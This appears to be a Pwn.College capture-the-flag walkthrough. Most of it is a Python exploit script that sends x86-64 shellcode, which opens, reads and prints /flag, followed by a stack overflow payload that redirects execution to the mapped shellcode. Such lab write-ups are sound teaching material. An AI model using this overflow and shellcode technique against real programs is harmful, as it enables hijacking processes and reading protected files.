# Stage 17: Hijack to (Mapped) Shellcode (Easy) — CTF Walkthrough

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | Easy |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | — |
| **VT Score** | N/A |

---

## Challenge

The original solution is a script that writes to stdout: the shellcode NOP-padded (`\x90`) out to a full 0x1000 page, then a newline, then the overflow payload — 56 bytes of `A` padding with the little-endian address `0x300a8000` (where the mapped shellcode lives) appended.

## Solution

```python
#!/usr/bin/env python3
import sys
import struct

shellcode = b'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x50\x48\xbb\x2f\x66\x6c\x61\x67\x00\x00\x00\x53\x48\x89\xe7\xb0\x02\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\x89\xe6\xba\x00\x10\x00\x00\x0f\x05\x48\x31\xff\x40\xb7\x01\x48\x89\xc2\x48\x31\xc0\x40\xb0\x01\x0f\x05\x48\x31\xc0\x48\x31\xff\xb0\x3c\x0f\x05'
shellcode = shellcode.ljust(0x1000, b'\x90')

offset = 56
shellcode_addr = 0x300a8000

payload = b'A' * offset
payload += struct.pack('<Q', shellcode_addr)

sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'\n')
sys.stdout.buffer.write(payload)
```
